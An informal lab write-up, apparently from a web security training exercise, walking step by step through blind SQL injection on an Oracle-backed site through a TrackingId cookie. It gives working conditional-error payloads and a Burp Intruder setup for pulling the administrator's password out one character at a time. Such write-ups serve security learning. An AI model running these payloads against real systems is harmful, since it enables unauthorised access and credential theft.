in this lab we had to perform a blind sqli to figure out the admin credentials


first we tried url injection did not work

second i tried open burpsuit and opened the browser there and fetched the packet of going into a categories in the webpage

now sent the package to the repeater and checked the packet

appended the ' in the trackingid and it gave error but when '' added it did not give error so we can determine that sqli is possible.
NOTE: || --> this is the concat option in oracle database so whatever we write after it will be sent with the trackingid.

to check which database it is we can simply add this querry at the end of tracking id:
  ' || (SELECT '' )-- 
  if it is either sqlmap or postgresql database it will work and it will give 200 ok responce

  however, when it is oracle it will give 500 error which it did give and when performed select '' from dual -- it worked so it confirmed that is it an oracle database.

after that we confirmed that our querry is being processed into the database: ' || (select '' from dual)--

now to check that users table exists:
'|| (SELECT '' FROM users WHERE ROWNUM = 1)--

To confirm that administrator user exists we can check

'|| (SELECT '' FROM users WHERE username = 'administrator')--

TO check the behaviour of the querry:
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)--
this gives 500 error message
but the 1=2 it gives 200 ok message 

to get the length of the password of the admin:

'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')

NOW keep checking by incleasing the >1 value to check where the length range lies. here the length is 20 so it gave 200 when passwor>20

so now we just need to send the payload to fetch the each value of 20 one by one

for that send the package to intruder by right clicking on the packet info there in the repeater

after that change the query to : 
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--

in this keep in mind that we have to add the change option from the button above to the value we want for the intruder to automatically change which in case it is 'a' and oress add then it will be in center of those symbols here.

now enter the range in the payload section in the right window of the intruder. press add and one by one add--> a->enter, b->enter,....z->enter. then 0-9 as well

now directly press attack and we can directly see the status code column there when we see the 500 error it is the digit/letter of that perticular index of password. the rest of them will be 200

now keep incrementing the position 1->2->3->........20.
write the password somewhere down, and login in with administrator credintials. lab solved
